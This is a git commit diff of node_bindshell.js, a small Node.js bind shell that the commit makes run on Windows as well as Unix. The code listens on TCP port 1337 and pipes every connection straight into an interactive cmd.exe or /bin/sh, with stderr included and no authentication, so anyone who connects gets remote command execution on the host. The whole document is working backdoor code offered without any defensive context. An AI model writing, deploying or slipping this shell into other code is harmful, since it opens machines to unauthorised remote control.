e96099ae33f2c0611ccb415d864e52e7ce3622fb
Christian Schmied <cs8898@gmx.de>
2014-12-23 21:29:43 +0100

    =Made Windows Compatible, Reversshell will spawn after shell exit

--- node_bindshell.js
+++ node_bindshell.js
@@ -1,9 +1,14 @@
 var net = require('net');
-var cp = require('child_process');
- 
+var spawn = require('child_process').spawn;
+
+PORT="1337";
+
+if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
+
 var server = net.createServer(function (c) {
-    var sh = cp.spawn('sh', ['-i']);
+    var sh = spawn((process.platform.contains('win')?'cmd.exe':'/bin/sh'), ['-i']);
     c.pipe(sh.stdin);
     sh.stdout.pipe(c);
+    sh.stderr.pipe(c);
 });
-server.listen(1337);
+server.listen(PORT);
